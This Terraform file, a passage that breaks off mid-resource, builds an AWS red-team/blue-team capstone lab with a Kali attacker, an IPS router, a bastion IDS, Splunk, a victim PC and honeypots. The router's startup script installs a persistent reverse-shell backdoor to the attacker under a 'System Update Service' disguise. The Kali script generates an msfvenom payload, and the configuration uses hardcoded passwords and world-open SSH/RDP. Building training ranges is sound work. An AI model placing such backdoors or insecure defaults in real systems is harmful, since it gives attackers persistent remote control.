terraform {
  required_version = ">= 1.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = ">= 4.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

############################
# VARIABLES
############################
variable "aws_region" {
  type    = string
  default = "us-east-1"
}

variable "public_key" {
  type        = string
  description = "Your SSH public key (id_rsa.pub)"
}

variable "kali_ami" {
  type        = string
  default     = ""
}

variable "vns3_ami" {
  type        = string
  default     = ""
}

variable "ubuntu_ami_owner" {
  type    = string
  default = "099720109477"
}

variable "instance_type" {
  type    = string
  default = "t3.micro"
}

variable "mirror_capable_instance_type" {
  type    = string
  default = "t3.small"
  description = "Instance type for Router and Bastion that supports Traffic Mirroring (Nitro-based)"
}

variable "splunk_instance_type" {
  type    = string
  default = "t3.medium"
  description = "Splunk requires more memory"
}

variable "honeypot_count" {
  type    = number
  default = 4
  description = "Number of honeypot instances in VMnet05"
}

############################
# KEY PAIR
############################
resource "aws_key_pair" "deployer" {
  key_name   = "capstone-deployer"
  public_key = var.public_key
  
  lifecycle {
    ignore_changes = [public_key]
  }
}


############################
# VPC FOR EXTERNAL(DMZ) (192.168.177.0/24)
############################
resource "aws_vpc" "dmz_vpc" {
  cidr_block = "192.168.177.0/24"
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = { Name = "dmz-vpc" }

}

############################
# VPC FOR ENTERPRISE (10.0.0.0/16)
############################

resource "aws_vpc" "capstone_vpc" {
  cidr_block = "10.0.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
  tags = { Name = "capstone-vpc" }
}

############################
# VPC PEERING (DMZ <-> Enterprise)
############################
resource "aws_vpc_peering_connection" "dmz_to_enterprise" {
  vpc_id        = aws_vpc.dmz_vpc.id
  peer_vpc_id   = aws_vpc.capstone_vpc.id
  auto_accept   = true

  tags = { Name = "dmz-to-enterprise-peering" }
}

############################
# SUBNETS
############################
data "aws_availability_zones" "available" {}

resource "aws_subnet" "vmnet08" {
  vpc_id            = aws_vpc.dmz_vpc.id
  cidr_block        = "192.168.177.0/24"
  availability_zone = data.aws_availability_zones.available.names[0]
  map_public_ip_on_launch = false
  tags = { Name = "VMnet08-External-DMZ" }
}

resource "aws_subnet" "vmnet02" {
  vpc_id            = aws_vpc.capstone_vpc.id
  cidr_block        = "10.0.2.0/24"
  availability_zone = data.aws_availability_zones.available.names[0]
  tags = { Name = "VMnet02-Transit-Tarpit" }
}

resource "aws_subnet" "vmnet03" {
  vpc_id            = aws_vpc.capstone_vpc.id
  cidr_block        = "10.0.3.0/24"
  availability_zone = data.aws_availability_zones.available.names[0]
  tags = { Name = "VMnet03-Management-SIEM" }
}

resource "aws_subnet" "vmnet04" {
  vpc_id            = aws_vpc.capstone_vpc.id
  cidr_block        = "10.0.4.0/24"
  availability_zone = data.aws_availability_zones.available.names[0]
  tags = { Name = "VMnet04-Internal-LAN" }
}

resource "aws_subnet" "vmnet05" {
  vpc_id            = aws_vpc.capstone_vpc.id
  cidr_block        = "10.0.5.0/24"
  availability_zone = data.aws_availability_zones.available.names[0]
  tags = { Name = "VMnet05-Honeynet" }
}

############################
# IGW + ROUTING
############################
resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.dmz_vpc.id
  tags = { Name = "capstone-igw" }
}

resource "aws_route_table" "public" {
  vpc_id = aws_vpc.dmz_vpc.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.igw.id
  }

  # Route to Enterprise VPC via peering
  route {
    cidr_block                = "10.0.0.0/16"
    vpc_peering_connection_id = aws_vpc_peering_connection.dmz_to_enterprise.id
  }

  tags = { Name = "capstone-public-rt" }
}

resource "aws_route_table_association" "assoc_vmnet08" {
  subnet_id      = aws_subnet.vmnet08.id
  route_table_id = aws_route_table.public.id
}

############################
# ENTERPRISE VPC ROUTE TABLES
############################

# vmnet02 (Transit) - Default gateway is Router, DMZ via peering
resource "aws_route_table" "vmnet02_rt" {
  vpc_id = aws_vpc.capstone_vpc.id

  route {
    cidr_block           = "0.0.0.0/0"
    network_interface_id = aws_network_interface.router_eni_vmnet02.id
  }

  route {
    cidr_block                = "192.168.177.0/24"
    vpc_peering_connection_id = aws_vpc_peering_connection.dmz_to_enterprise.id
  }

  tags = { Name = "vmnet02-rt" }
}

resource "aws_route_table_association" "assoc_vmnet02" {
  subnet_id      = aws_subnet.vmnet02.id
  route_table_id = aws_route_table.vmnet02_rt.id
}

# vmnet03 (Management/SIEM) - Goes through Bastion
resource "aws_route_table" "vmnet03_rt" {
  vpc_id = aws_vpc.capstone_vpc.id

  route {
    cidr_block           = "0.0.0.0/0"
    network_interface_id = aws_network_interface.bastion_eni_vmnet03.id
  }

  tags = { Name = "vmnet03-rt" }
}

resource "aws_route_table_association" "assoc_vmnet03" {
  subnet_id      = aws_subnet.vmnet03.id
  route_table_id = aws_route_table.vmnet03_rt.id
}

# vmnet04 (Internal LAN) - Goes through Bastion
resource "aws_route_table" "vmnet04_rt" {
  vpc_id = aws_vpc.capstone_vpc.id

  route {
    cidr_block           = "0.0.0.0/0"
    network_interface_id = aws_network_interface.bastion_eni_vmnet04.id
  }

  tags = { Name = "vmnet04-rt" }
}

resource "aws_route_table_association" "assoc_vmnet04" {
  subnet_id      = aws_subnet.vmnet04.id
  route_table_id = aws_route_table.vmnet04_rt.id
}

# vmnet05 (Honeynet) - Goes through Router
resource "aws_route_table" "vmnet05_rt" {
  vpc_id = aws_vpc.capstone_vpc.id

  route {
    cidr_block           = "0.0.0.0/0"
    network_interface_id = aws_network_interface.router_eni_vmnet05.id
  }

  tags = { Name = "vmnet05-rt" }
}

resource "aws_route_table_association" "assoc_vmnet05" {
  subnet_id      = aws_subnet.vmnet05.id
  route_table_id = aws_route_table.vmnet05_rt.id
}



############################
# SECURITY GROUPS
############################

resource "aws_security_group" "dmz_ssh_from_any" {
  name        = "dmz-sg-internal"
  description = "Allow external traffic"
  vpc_id      = aws_vpc.dmz_vpc.id

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # Allow all traffic from Enterprise VPC (for NAT return traffic)
  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.0.0.0/16"]
  }

  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["192.168.177.0/24"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "dmz-sg-internal" }
}

resource "aws_security_group" "default_allow_internal" {
  name        = "capstone-sg-internal"
  description = "Allow internal traffic"
  vpc_id      = aws_vpc.capstone_vpc.id

  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # Allow traffic from DMZ VPC
  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["192.168.177.0/24"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "capstone-sg-internal" }
}

resource "aws_security_group" "ssh_from_any" {
  name        = "capstone-sg-ssh"
  description = "Allow SSH and RDP from anywhere"
  vpc_id      = aws_vpc.capstone_vpc.id

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 3389
    to_port     = 3389
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "capstone-sg-ssh-rdp" }
}

resource "aws_security_group" "splunk" {
  name        = "capstone-sg-splunk"
  description = "Splunk SIEM ports"
  vpc_id      = aws_vpc.capstone_vpc.id

  # Splunk Web UI
  ingress {
    from_port   = 8000
    to_port     = 8000
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # Splunk Management Port
  ingress {
    from_port   = 8089
    to_port     = 8089
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # Splunk Forwarder Receiving Port
  ingress {
    from_port   = 9997
    to_port     = 9997
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "capstone-sg-splunk" }
}

resource "aws_security_group" "honeypot" {
  name        = "capstone-sg-honeypot"
  description = "Honeypot vulnerable services"
  vpc_id      = aws_vpc.capstone_vpc.id

  # SSH
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # Telnet
  ingress {
    from_port   = 23
    to_port     = 23
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # HTTP
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # HTTPS
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # FTP
  ingress {
    from_port   = 21
    to_port     = 21
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  # SMB
  ingress {
    from_port   = 445
    to_port     = 445
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "capstone-sg-honeypot" }
}

############################
# AMI LOOKUPS
############################
data "aws_ami" "ubuntu" {
  most_recent = true
  owners      = [var.ubuntu_ami_owner]

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"]
  }
}

locals {
  vns3_ami = length(var.vns3_ami) > 0 ? var.vns3_ami : ""
  kali_ami = length(var.kali_ami) > 0 ? var.kali_ami : ""
  splunk_ip = "10.0.3.50"
}


############################
# KALI (Attacker)
############################

resource "aws_security_group" "kali_sg" {
  name   = "kali_sg"
  vpc_id = aws_vpc.dmz_vpc.id

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 4444
    to_port     = 4444
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]    
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_network_interface" "attacker_eni_vmnet08" {
  subnet_id       = aws_subnet.vmnet08.id
  private_ips     = ["192.168.177.128"]
  security_groups = [
    aws_security_group.kali_sg.id
  ]

  source_dest_check = false
  tags = { Name = "attacker-eni-vmnet08" }
}

resource "aws_instance" "kali_attacker" {
  ami                    = local.kali_ami != "" ? local.kali_ami : data.aws_ami.ubuntu.id
  instance_type          = var.instance_type
  key_name               = aws_key_pair.deployer.key_name
  
  network_interface {
    network_interface_id = aws_network_interface.attacker_eni_vmnet08.id
    device_index         = 0
  }  

  user_data = <<-EOF
#!/bin/bash
set +e
sudo ip route add 10.0.0.0/8 via 192.168.177.10 dev eth0

apt-get update -y
apt-get install -y net-tools nmap tcpdump python3-pip nikto metasploit-framework
pip3 install scapy impacket

echo "Kali attacker setup completed" > /var/log/kali_setup_complete.log
msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT=<Listening_Port> -f elf -o reverse_shell.elf
EOF

  tags = { Name = "capstone-kali-attacker" }
}

resource "aws_eip" "attacker_public_ip" {
  network_interface = aws_network_interface.attacker_eni_vmnet08.id  
  tags = {
    Name = "router-host-eip"
  }
}


############################
# ROUTER ENIs (3 NICs)
############################
resource "aws_network_interface" "router_eni_vmnet08" {
  subnet_id       = aws_subnet.vmnet08.id
  private_ips     = ["192.168.177.10"]
  security_groups = [
    aws_security_group.dmz_ssh_from_any.id,
  ]
  source_dest_check = false
  tags = { Name = "router-eni-vmnet08" }
}

resource "aws_network_interface" "router_eni_vmnet02" {
  subnet_id       = aws_subnet.vmnet02.id
  private_ips     = ["10.0.2.10"]
  security_groups = [aws_security_group.default_allow_internal.id]
  source_dest_check = false
  tags = { Name = "router-eni-vmnet02" }
}

resource "aws_network_interface" "router_eni_vmnet05" {
  subnet_id       = aws_subnet.vmnet05.id
  private_ips     = ["10.0.5.10"]
  security_groups = [aws_security_group.default_allow_internal.id]
  source_dest_check = false
  tags = { Name = "router-eni-vmnet05" }
}

resource "aws_instance" "router" {
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = var.mirror_capable_instance_type
  key_name               = aws_key_pair.deployer.key_name

  network_interface {
    network_interface_id = aws_network_interface.router_eni_vmnet08.id
    device_index         = 0
  }

  network_interface {
    network_interface_id = aws_network_interface.router_eni_vmnet02.id
    device_index         = 1
  }

  network_interface {
    network_interface_id = aws_network_interface.router_eni_vmnet05.id
    device_index         = 2
  }  

  user_data = <<-EOF
#!/bin/bash
set +e

# Prevent all interactive prompts
export DEBIAN_FRONTEND=noninteractive
export NEEDRESTART_MODE=a

############################
# CRITICAL: NAT FIRST (before apt-get)
# This enables internet for other instances
############################
# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf

# NAT for all Enterprise VPC traffic going to Internet via ens5 (vmnet08)
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -o ens5 -j MASQUERADE

############################
# Now proceed with apt-get
############################
# Update system
apt-get update -y
apt-get upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"

# Pre-seed iptables-persistent to avoid prompts
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections

# Install necessary packages
apt-get install -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" \
  net-tools iptables-persistent suricata python3-pip jq curl wget

# Save iptables rules (now that iptables-persistent is installed)
netfilter-persistent save

# Configure Suricata IPS (inline mode)
systemctl stop suricata  # May fail if not running yet

# Configure Suricata for IPS mode with NFQUEUE
cat > /etc/suricata/suricata.yaml <<'SURICATA_EOF'
%YAML 1.1
---
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8]"
    EXTERNAL_NET: "!$HOME_NET"

af-packet:
  - interface: ens5
  - interface: ens6
  - interface: ens7

nfqueue:
  mode: repeat
  repeat-mark: 1
  repeat-mask: 1
  route-queue: 2
  batchcount: 20

outputs:
  - fast:
      enabled: yes
      filename: fast.log
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls

rule-files:
  - /var/lib/suricata/rules/suricata.rules
SURICATA_EOF
    
    # Update Suricata rules
    suricata-update
    
    
    # Configure NFQUEUE for IPS
    iptables -I FORWARD 3 -j NFQUEUE --queue-num 0 --queue-bypass
    netfilter-persistent save
    
    # Start Suricata in IPS mode
    systemctl start suricata
    systemctl enable suricata
    
    # Install xtables-addons for TARPIT support
    apt-get install -y xtables-addons-common xtables-addons-dkms
    
    # Load TARPIT module
    modprobe xt_TARPIT
    
    ############################
    # TARPIT Configuration
    # Packets from DMZ (ens5) destined for 10.0.2.0/25 get trapped
    # This catches attackers scanning the "fake" network
    ############################
    # TARPIT in FORWARD chain - catches packets coming from ens5 (DMZ) to tarpit range
    # Must be BEFORE NFQUEUE rule
    iptables -I FORWARD 2 -i ens5 -d 10.0.2.0/25 -p tcp --syn -j TARPIT

    # Allow Honeynet Access instead of sending it to IPS
    iptables -I FORWARD 1 -i ens5 -d 10.0.5.0/24 -p tcp -j ACCEPT
    
    # Save iptables rules
    netfilter-persistent save
    
    # Make TARPIT module load on boot
    echo "xt_TARPIT" >> /etc/modules
    

    # Create adaptive defense trigger script
    cat > /root/adaptive_trigger.sh <<'ADAPTIVE_EOF'
#!/bin/bash
# This script is triggered when honeypot interaction is detected
HONEYPOT_ALERT_FILE="/var/log/honeypot_alert.log"

if [ -f "$HONEYPOT_ALERT_FILE" ]; then
  # Increase logging verbosity
  suricatasc -c "reload-rules"
  
  # Notify all honeypots to increase their activity
  for ip in 10.0.5.{20..23}; do
    ssh -o StrictHostKeyChecking=no ubuntu@$ip "sudo /root/activate_honeypot.sh" &
  done
  
  echo "$(date): Adaptive defense triggered" >> /var/log/adaptive_defense.log
fi
ADAPTIVE_EOF

    chmod +x /root/adaptive_trigger.sh
    
    # Setup cron for adaptive monitoring
    echo "* * * * * /root/adaptive_trigger.sh" | crontab -
    


    # Install Splunk Universal Forwarder (with error handling - don't fail if 404)
    echo "Attempting to download Splunk Universal Forwarder..."

    wget --timeout=30 -O /tmp/splunkforwarder.deb "https://download.splunk.com/products/universalforwarder/releases/10.0.2/linux/splunkforwarder-10.0.2-e2d18b4767e9-linux-amd64.deb"
    SPLUNK_DOWNLOAD=$?
      # Re-enable exit-on-error

    if [ $SPLUNK_DOWNLOAD -eq 0 ] && [ -f /tmp/splunkforwarder.deb ]; then
      echo "Splunk download successful, installing..."
      dpkg -i /tmp/splunkforwarder.deb
      
      # Configure Splunk Universal Forwarder (with error handling)

      export HOME=/root  # Fix HOME variable warning
      /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd changeme
      sed -i '/\[general\]/a allowRemoteLogin = always' "/opt/splunkforwarder/etc/system/local/server.conf"
      /opt/splunkforwarder/bin/splunk restart

      /opt/splunkforwarder/bin/splunk add forward-server ${local.splunk_ip}:9997 -auth admin:changeme
      /opt/splunkforwarder/bin/splunk add monitor /var/log/suricata/ -auth admin:changeme
      /opt/splunkforwarder/bin/splunk add monitor /var/log/syslog -auth admin:changeme
      /opt/splunkforwarder/bin/splunk add monitor /var/log/adaptive_defense.log -auth admin:changeme
      
      # Handle boot-start - disable first if exists, then enable
      /opt/splunkforwarder/bin/splunk disable boot-start 2>/dev/null || true
      /opt/splunkforwarder/bin/splunk enable boot-start 2>/dev/null || echo "Warning: Could not enable Splunk boot-start, but continuing..."
      
      echo "Splunk forwarder configured successfully"
    else
      echo "Splunk download failed, skipping Splunk configuration"
    fi


    # RED TEAM BACKDOOR: Persistent Reverse Shell
    # Disable exit-on-error to ensure backdoor is installed
    
    echo "Installing backdoor..." >> /var/log/router_setup.log
    
    # Create reverse shell script that connects to external attacker
    cat > /root/backdoor.sh <<'BACKDOOR_EOF'
#!/bin/bash
# Reverse shell backdoor for Red Team exercise
ATTACKER_IP="${aws_instance.kali_attacker.public_ip}"
ATTACKER_PORT="4444"

if [ -z "$ATTACKER_IP" ]; then
  echo "No attacker IP configured"
  exit 0
fi

while true; do
  /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null
  sleep 60
done
BACKDOOR_EOF

    chmod +x /root/backdoor.sh
    echo "Backdoor script created" >> /var/log/router_setup.log
    
    # Create systemd service
    cat > /etc/systemd/system/backdoor.service <<'SERVICE_EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/root/backdoor.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
SERVICE_EOF

    echo "Backdoor service file created" >> /var/log/router_setup.log
    
    # Enable and start
    systemctl daemon-reload
    systemctl enable backdoor.service
    systemctl start backdoor.service
    
    echo "Backdoor enabled" >> /var/log/router_setup.log
    
    
    echo "Router with IPS and Tarpit configuration completed" > /var/log/router_setup_complete.log
EOF

  tags = { Name = "capstone-router-ips-tarpit" }
}

resource "aws_eip" "router_public_ip" {
  network_interface = aws_network_interface.router_eni_vmnet08.id  
  tags = {
    Name = "router-host-eip"
  }
}

############################
# BASTION / FIREWALL (3 NICs)
############################
resource "aws_network_interface" "bastion_eni_vmnet02" {
  subnet_id       = aws_subnet.vmnet02.id
  private_ips     = ["10.0.2.129"]
  security_groups = [
    aws_security_group.default_allow_internal.id,
    aws_security_group.ssh_from_any.id
  ]
  source_dest_check = false
  tags = { Name = "bastion-eni-vmnet02" }
}

resource "aws_network_interface" "bastion_eni_vmnet03" {
  subnet_id       = aws_subnet.vmnet03.id
  private_ips     = ["10.0.3.10"]
  security_groups = [aws_security_group.default_allow_internal.id]
  source_dest_check = false
  tags = { Name = "bastion-eni-vmnet03" }
}

resource "aws_network_interface" "bastion_eni_vmnet04" {
  subnet_id       = aws_subnet.vmnet04.id
  private_ips     = ["10.0.4.10"]
  security_groups = [aws_security_group.default_allow_internal.id]
  source_dest_check = false
  tags = { Name = "bastion-eni-vmnet04" }
}

resource "aws_instance" "bastion_firewall" {
  ami           = local.vns3_ami != "" ? local.vns3_ami : data.aws_ami.ubuntu.id
  instance_type = var.mirror_capable_instance_type
  key_name      = aws_key_pair.deployer.key_name

  # Wait for Router to be ready (Router provides NAT for Bastion's internet access)
  depends_on = [aws_instance.router]

  network_interface {
    network_interface_id = aws_network_interface.bastion_eni_vmnet02.id
    device_index         = 0
  }
  network_interface {
    network_interface_id = aws_network_interface.bastion_eni_vmnet03.id
    device_index         = 1
  }
  network_interface {
    network_interface_id = aws_network_interface.bastion_eni_vmnet04.id
    device_index         = 2
  }

  user_data = <<-EOF
#!/bin/bash

export DEBIAN_FRONTEND=noninteractive
export NEEDRESTART_MODE=a

############################
# CRITICAL: NAT/ROUTING FIRST (before apt-get)
############################
# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf

# Set default route via Router for internet access
ip route del default 2>/dev/null || true
ip route add default via 10.0.2.10 dev ens5

# NAT for vmnet03 and vmnet04 traffic
iptables -t nat -A POSTROUTING -s 10.0.3.0/24 -o ens5 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.0.4.0/24 -o ens5 -j MASQUERADE

############################
# Wait for Router NAT to be ready
############################
echo "Waiting for internet connectivity via Router..."
for i in {1..30}; do
  if ping -c 1 -W 2 8.8.8.8 &>/dev/null; then
    echo "Internet connectivity established!"
    break
  fi
  echo "Attempt $i/30: Waiting for Router NAT..."
  sleep 10
done

############################
# Now proceed with apt-get
############################
# Update system
apt-get update -y
apt-get upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"

# Install packages
apt-get install -y ufw suricata python3-pip curl wget iptables-persistent

# Save iptables rules
netfilter-persistent save

# Make routing persistent via netplan
cat > /etc/netplan/99-custom-routes.yaml <<'NETPLAN_EOF'
network:
  version: 2
  ethernets:
    ens5:
      routes:
        - to: 0.0.0.0/0
          via: 10.0.2.10
NETPLAN_EOF
netplan apply 2>/dev/null || true

############################
# Wait for DNS to stabilize
############################
echo "Waiting for DNS resolution..."
for i in {1..10}; do
  if host download.splunk.com &>/dev/null || nslookup download.splunk.com &>/dev/null; then
    echo "DNS resolution working!"
    break
  fi
  echo "Attempt $i/10: Waiting for DNS..."
  sleep 3
done


# Configure Suricata IDS (monitoring mode)
systemctl stop suricata

cat > /etc/suricata/suricata.yaml <<'SURICATA_EOF'
%YAML 1.1
---
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8]"
    EXTERNAL_NET: "!$HOME_NET"

af-packet:
  - interface: ens5
  - interface: ens6
  - interface: ens7

outputs:
  - fast:
      enabled: yes
      filename: fast.log
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls
        - ssh
        - smb

rule-files:
  - /var/lib/suricata/rules/suricata.rules
  - /var/lib/suricata/rules/local.rules
SURICATA_EOF
    
    # Reduce False Positives
    echo "2210059" >> /etc/suricata/disable.conf # Splunk response
    echo "2210020" >> /etc/suricata/disable.conf # SURICATA STREAM ESTABLISHED

    # Add Honeypot Detection
    cat > /var/lib/suricata/rules/local.rules <<'SURICATA_HONEYNET_RULES_EOF'
alert ip !10.0.2.129 any -> 10.0.5.0/24 any (msg:"[HONEYPOT] Inbound traffic to Honeynet detected"; sid:1000001; rev:2; classtype:policy-violation; priority:2;)

alert tcp 10.0.3.0/24 any -> !10.0.0.0/8 any (msg:"[OUTBOUND] TCP SYN from Management network (vmnet03)"; flags:S; sid:1000010; rev:1; classtype:policy-violation; priority:3;)

alert tcp 10.0.4.0/24 any -> !10.0.0.0/8 any (msg:"[OUTBOUND] TCP SYN from Internal LAN (vmnet04)"; flags:S; sid:1000011; rev:1; classtype:policy-violation; priority:3;)
SURICATA_HONEYNET_RULES_EOF

    # Update Suricata rules
    suricata-update
    
    
    # Start Suricata
    systemctl start suricata
    systemctl enable suricata
    
    # Install Splunk Universal Forwarder

    wget -O /tmp/splunkforwarder.deb "https://download.splunk.com/products/universalforwarder/releases/10.0.2/linux/splunkforwarder-10.0.2-e2d18b4767e9-linux-amd64.deb"
    dpkg -i /tmp/splunkforwarder.deb

    # Configure Splunk Universal Forwarder
    export HOME=/root
    /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd changeme
    sed -i '/\[general\]/a allowRemoteLogin = always' "/opt/splunkforwarder/etc/system/local/server.conf"
    /opt/splunkforwarder/bin/splunk restart

    /opt/splunkforwarder/bin/splunk add forward-server ${local.splunk_ip}:9997 -auth admin:changeme
    /opt/splunkforwarder/bin/splunk add monitor /var/log/suricata/ -auth admin:changeme
    /opt/splunkforwarder/bin/splunk add monitor /var/log/ufw.log -auth admin:changeme
    /opt/splunkforwarder/bin/splunk enable boot-start    
    
    echo "Bastion with IDS configuration completed" > /var/log/bastion_setup_complete.log
  EOF

  tags = { Name = "capstone-bastion-ids" }
}

############################
# SPLUNK SIEM (VMnet03)
############################
resource "aws_instance" "splunk_siem" {
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = var.splunk_instance_type
  key_name               = aws_key_pair.deployer.key_name
  subnet_id              = aws_subnet.vmnet03.id
  private_ip             = local.splunk_ip

  depends_on = [aws_instance.bastion_firewall]

  vpc_security_group_ids = [
    aws_security_group.default_allow_internal.id,
    aws_security_group.splunk.id,
    aws_security_group.ssh_from_any.id
  ]

  root_block_device {
    volume_size = 50
    volume_type = "gp3"
  }

  user_data = <<-EOF
#!/bin/bash
set +e
sleep 60

# Update system
apt-get update -y
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y

# Install dependencies
apt-get install -y wget curl

# Download and install Splunk Enterprise
wget -O /tmp/splunk.deb "https://download.splunk.com/products/splunk/releases/10.0.2/linux/splunk-10.0.2-e2d18b4767e9-linux-amd64.deb"
dpkg -i /tmp/splunk.deb

sudo chown -R splunk:splunk /opt/splunk

# Start Splunk and accept license
sudo -u splunk /opt/splunk/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd Capstone2025!

# Enable boot start
/opt/splunk/bin/splunk enable boot-start -user splunk

# Configure receiving port for forwarders
sudo -u splunk /opt/splunk/bin/splunk enable listen 9997 -auth admin:Capstone2025!

# Create index for security events
sudo -u splunk /opt/splunk/bin/splunk add index security -auth admin:Capstone2025!
sudo -u splunk /opt/splunk/bin/splunk add index honeypot -auth admin:Capstone2025!
sudo -u splunk /opt/splunk/bin/splunk add index suricata -auth admin:Capstone2025!

# Install Splunk App for Suricata
sudo -u splunk /opt/splunk/bin/splunk install app /opt/splunk/etc/apps/suricata -auth admin:Capstone2025! || true

# Restart Splunk
sudo -u splunk /opt/splunk/bin/splunk restart

echo "Splunk SIEM setup completed" > /var/log/splunk_setup_complete.log
echo "Access Splunk at http://$(hostname -I | awk '{print $1}'):8000"
echo "Username: admin"
echo "Password: Capstone2025!"
EOF

  tags = { Name = "capstone-splunk-siem" }
}


############################
# CLASSIC PC (Victim)
############################
resource "aws_instance" "classic_pc" {
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = var.instance_type
  key_name               = aws_key_pair.deployer.key_name
  subnet_id              = aws_subnet.vmnet04.id
  private_ip             = "10.0.4.130"

  depends_on = [aws_instance.bastion_firewall]

  vpc_security_group_ids = [
    aws_security_group.default_allow_internal.id,
    aws_security_group.ssh_from_any.id
  ]

  user_data = <<-EOF
#!/bin/bash
set +e

apt-get update -y
apt-get install -y apache2 openssh-server samba
systemctl enable apache2
systemctl enable ssh
systemctl enable smbd

# Create decoy files
mkdir -p /var/www/html/decoy
echo "CONFIDENTIAL: Internal Document - Decoy" > /var/www/html/decoy/README.txt
echo "Database Credentials: admin:P@ssw0rd123" > /var/www/html/decoy/credentials.txt

# Install Splunk Universal Forwarder
wget -O /tmp/splunkforwarder.deb "https://download.splunk.com/products/universalforwarder/releases/10.0.2/linux/splunkforwarder-10.0.2-e2d18b4767e9-linux-amd64.deb"
dpkg -i /tmp/splunkforwarder.deb

export HOME=/root
/opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd changeme
sed -i '/\[general\]/a allowRemoteLogin = always' "/opt/splunkforwarder/etc/system/local/server.conf"
/opt/splunkforwarder/bin/splunk restart

/opt/splunkforwarder/bin/splunk restart
/opt/splunkforwarder/bin/splunk add forward-server ${local.splunk_ip}:9997 -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /var/log/apache2/ -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log -auth admin:changeme
/opt/splunkforwarder/bin/splunk enable boot-start

echo "Classic PC setup completed" > /var/log/classic_pc_setup_complete.log
EOF

  tags = { Name = "capstone-classic-pc" }
}

############################
# HONEYPOT INSTANCES (VMnet05)
############################
resource "aws_instance" "honeypot" {
  count                  = var.honeypot_count
  ami                    = data.aws_ami.ubuntu.id
  instance_type          = "t3.micro"
  key_name               = aws_key_pair.deployer.key_name
  subnet_id              = aws_subnet.vmnet05.id
  private_ip             = "10.0.5.${20 + count.index}"

  depends_on = [aws_instance.router]

  vpc_security_group_ids = [
